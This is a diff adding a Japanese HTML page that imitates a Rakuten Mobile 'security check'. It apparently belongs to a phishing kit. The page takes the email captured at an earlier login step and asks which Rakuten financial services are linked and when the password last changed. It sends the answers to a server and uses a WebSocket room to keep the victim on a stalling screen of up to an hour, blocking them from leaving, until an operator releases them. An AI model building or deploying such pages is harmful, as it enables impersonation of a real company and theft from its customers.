@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>セキュリティチェック - 楽天モバイル</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Helvetica Neue", Arial, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;
+            background-color: #f4f5fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 700px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo svg {
+            height: 32px;
+            width: auto;
+        }
+
+        .logo path {
+            fill: #bf0000;
+        }
+
+        h1 {
+            color: #bf0000;
+            font-size: 28px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .screen {
+            display: none;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        .question {
+            margin-bottom: 30px;
+        }
+
+        .question-label {
+            display: block;
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .radio-option {
+            display: flex;
+            align-items: center;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .radio-option:hover {
+            border-color: #bf0000;
+            background-color: #fafafa;
+        }
+
+        .radio-option input[type="radio"] {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            cursor: pointer;
+            accent-color: #bf0000;
+        }
+
+        .radio-option label {
+            flex: 1;
+            cursor: pointer;
+            font-size: 15px;
+            color: #333;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 16px;
+            background-color: #bf0000;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-button:hover:not(:disabled) {
+            background-color: #a00000;
+        }
+
+        .submit-button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .loading-screen {
+            text-align: center;
+        }
+
+        .loading-text {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.8;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #bf0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .warning-text {
+            font-size: 14px;
+            color: #666;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #fff3cd;
+            border-radius: 6px;
+            border-left: 4px solid #ffc107;
+        }
+
+        .complete-screen {
+            text-align: center;
+        }
+
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #28a745;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 30px;
+        }
+
+        .check-icon::before {
+            content: '✓';
+            font-size: 50px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .complete-text {
+            font-size: 18px;
+            color: #333;
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .question-label {
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 166 50" height="32" width="106.24">
+                <path d="M41.2 49.4l92.3-8H33.2l8 8zm1.3-14.3v1.2h6.2V9.1h-6.2v1.2a10 10 0 0 0-5.8-1.9c-7 0-12.4 6.4-12.4 14.3S29.6 37 36.7 37c2.3 0 4-.7 5.8-1.9zM30.7 22.7c0-4.3 2.5-7.7 6-7.7s5.9 3.4 5.9 7.7c0 4.3-2.5 7.7-5.9 7.7-3.5 0-6-3.4-6-7.7zm56 14.3c3 0 5.3-1.7 5.3-1.7v1h6.2V9.1H92v16c0 3-2.1 5.5-5.1 5.5s-5.1-2.5-5.1-5.5v-16h-6.2v16c0 6.6 4.5 11.9 11.1 11.9zm68.2-28.6c-3 0-5.3 1.7-5.3 1.7v-1h-6.2v27.2h6.2v-16c0-3 2.1-5.5 5.1-5.5s5.1 2.5 5.1 5.5v16h6.2v-16c0-6.6-4.5-11.9-11.1-11.9zM22.4 14c0-6.5-5.3-11.7-11.7-11.7H0v34h6.5V25.8h4.6L19 36.3h8.1l-9.6-12.7c3-2.1 4.9-5.6 4.9-9.6zm-11.7 5.3H6.5V8.7h4.2c2.9 0 5.3 2.4 5.3 5.3s-2.4 5.3-5.3 5.3zm92.9 8c0 6.1 4.6 9.7 9.2 9.7a13 13 0 0 0 6-1.7l-4-5.4c-.6.4-1.3.7-2.1.7-1 0-2.9-.8-2.9-3.3V15.6h5.3V9.1h-5.3V2.3h-6.2v6.8h-3.3v6.5h3.3v11.7zm-45.1-2.2l9.2 11.2h8.6L64 21.8 74.6 9.1H66l-7.5 9.5V0h-6.3v36.3h6.3V25.1zm70.6-16.7c-7.2 0-12.3 6.3-12.3 14.3 0 8.4 6.4 14.3 12.9 14.3 3.3 0 7.4-1.1 10.9-6.1l-5.5-3.2c-4.2 6.2-11.3 3.1-12.1-3.2h17.8c1.7-9.7-4.7-16.1-11.7-16.1zm-5.7 10.8c1.3-6.4 9.9-6.8 11.1 0h-11.1z"></path>
+            </svg>
+        </div>
+
+        <div id="screenQuestions" class="screen active">
+            <h1>セキュリティチェック</h1>
+
+            <form id="securityForm">
+                <div class="question">
+                    <label class="question-label">
+                        １．こちらの楽天ID（ログインしたときに使用したメールアドレス又はユーザーID）で楽天カード、楽天銀行、楽天証券、楽天生命のいずれかの楽天グループのサービスの登録又は紐づけに使用していますか？
+                    </label>
+                    <div class="radio-group">
+                        <div class="radio-option">
+                            <input type="radio" name="q1" value="使用している" id="q1_1" required>
+                            <label for="q1_1">使用している</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q1" value="使用していない" id="q1_2" required>
+                            <label for="q1_2">使用していない</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q1" value="わからない" id="q1_3" required>
+                            <label for="q1_3">わからない</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question">
+                    <label class="question-label">
+                        ２．最近フィッシングサイトと思われるサイトに楽天IDを入力してしまった心当たりはありますか？
+                    </label>
+                    <div class="radio-group">
+                        <div class="radio-option">
+                            <input type="radio" name="q2" value="ある" id="q2_1" required>
+                            <label for="q2_1">ある</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q2" value="ない" id="q2_2" required>
+                            <label for="q2_2">ない</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q2" value="わからない" id="q2_3" required>
+                            <label for="q2_3">わからない</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question">
+                    <label class="question-label">
+                        ３．最近不審なログインやログイン確認メールが届いたことはありますか？
+                    </label>
+                    <div class="radio-group">
+                        <div class="radio-option">
+                            <input type="radio" name="q3" value="ある" id="q3_1" required>
+                            <label for="q3_1">ある</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q3" value="ない" id="q3_2" required>
+                            <label for="q3_2">ない</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q3" value="わからない" id="q3_3" required>
+                            <label for="q3_3">わからない</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question">
+                    <label class="question-label">
+                        ４．直近でメールアドレスを変更したのはいつですか？
+                    </label>
+                    <div class="radio-group">
+                        <div class="radio-option">
+                            <input type="radio" name="q4" value="1週間以内" id="q4_1" required>
+                            <label for="q4_1">1週間以内</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q4" value="1か月以内" id="q4_2" required>
+                            <label for="q4_2">1か月以内</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q4" value="半年以内" id="q4_3" required>
+                            <label for="q4_3">半年以内</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q4" value="半年以上前" id="q4_4" required>
+                            <label for="q4_4">半年以上前</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q4" value="わからない" id="q4_5" required>
+                            <label for="q4_5">わからない</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question">
+                    <label class="question-label">
+                        ５．直近でパスワードを変更したのはいつですか？
+                    </label>
+                    <div class="radio-group">
+                        <div class="radio-option">
+                            <input type="radio" name="q5" value="1週間以内" id="q5_1" required>
+                            <label for="q5_1">1週間以内</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q5" value="1か月以内" id="q5_2" required>
+                            <label for="q5_2">1か月以内</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q5" value="半年以内" id="q5_3" required>
+                            <label for="q5_3">半年以内</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q5" value="半年以上前" id="q5_4" required>
+                            <label for="q5_4">半年以上前</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" name="q5" value="わからない" id="q5_5" required>
+                            <label for="q5_5">わからない</label>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" id="submitButton" class="submit-button" disabled>送信</button>
+            </form>
+        </div>
+
+        <div id="screenLoading" class="screen">
+            <div class="loading-screen">
+                <h1>セキュリティチェック中</h1>
+                <div class="spinner"></div>
+                <div class="loading-text">
+                    現在セキュリティチェックを行っております。<br>
+                    混み合っていない場合や問題がない場合は直ぐに完了します。<br>
+                    （場合によっては最大1分から1時間かかる場合もございます）
+                </div>
+                <div class="warning-text">
+                    ※セキュリティチェック中はブラウザを消したり離れたりしないでください。正常に完了しない可能性がございます。
+                </div>
+            </div>
+        </div>
+
+        <div id="screenComplete" class="screen">
+            <div class="complete-screen">
+                <div class="check-icon"></div>
+                <h1>セキュリティチェック完了</h1>
+                <div class="complete-text">
+                    セキュリティチェックが完了いたしました。<br>
+                    ご協力いただきまして誠にありがとうございました。<br><br>
+                    更に情報が必要な場合はご連絡を差し上げる場合がございます。<br>
+                    今後とも楽天モバイルをよろしくお願いいたします。
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let userEmail = null;
+        let socket = null;
+
+        function getEmailFromSession() {
+            return sessionStorage.getItem('userEmail');
+        }
+
+        function checkAllAnswered() {
+            const form = document.getElementById('securityForm');
+            const questions = ['q1', 'q2', 'q3', 'q4', 'q5'];
+            
+            for (let q of questions) {
+                const answered = form.querySelector(`input[name="${q}"]:checked`);
+                if (!answered) {
+                    return false;
+                }
+            }
+            
+            return true;
+        }
+
+        function updateSubmitButton() {
+            const submitButton = document.getElementById('submitButton');
+            submitButton.disabled = !checkAllAnswered();
+        }
+
+        async function submitSecurityCheck(event) {
+            event.preventDefault();
+            
+            if (!userEmail) {
+                alert('セッション情報が見つかりません');
+                return;
+            }
+            
+            const form = document.getElementById('securityForm');
+            const formData = new FormData(form);
+            
+            const answers = {
+                q1: formData.get('q1'),
+                q2: formData.get('q2'),
+                q3: formData.get('q3'),
+                q4: formData.get('q4'),
+                q5: formData.get('q5')
+            };
+            
+            try {
+                const response = await fetch('/api/security-check/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: userEmail,
+                        answers: answers
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showScreen('screenLoading');
+                } else {
+                    alert('エラー: ' + data.message);
+                }
+            } catch (error) {
+                console.error('送信エラー:', error);
+                alert('エラーが発生しました');
+            }
+        }
+
+        function showScreen(screenId) {
+            const screens = document.querySelectorAll('.screen');
+            screens.forEach(screen => screen.classList.remove('active'));
+            
+            const targetScreen = document.getElementById(screenId);
+            if (targetScreen) {
+                targetScreen.classList.add('active');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            userEmail = getEmailFromSession();
+            
+            if (!userEmail) {
+                alert('セッション情報が見つかりません。ログインページに戻ります。');
+                window.location.href = '/login/email';
+                return;
+            }
+
+            // WebSocket接続
+            socket = io();
+            
+            socket.on('connect', () => {
+                console.log('[WebSocket] 接続成功');
+                socket.emit('join_user_room', { email: userEmail });
+            });
+
+            socket.on('security_check_completed', (data) => {
+                console.log('[WebSocket] セキュリティチェック完了通知受信');
+                showScreen('screenComplete');
+            });
+            
+            const radioButtons = document.querySelectorAll('input[type="radio"]');
+            radioButtons.forEach(radio => {
+                radio.addEventListener('change', updateSubmitButton);
+            });
+            
+            document.getElementById('securityForm').addEventListener('submit', submitSecurityCheck);
+        });
+
+        window.addEventListener('beforeunload', (event) => {
+            const loadingScreen = document.getElementById('screenLoading');
+            if (loadingScreen.classList.contains('active')) {
+                event.preventDefault();
+                event.returnValue = '';
+            }
+        });
+        
+        window.scrollTo(0, 0);
+    </script>
+</body>
+</html>
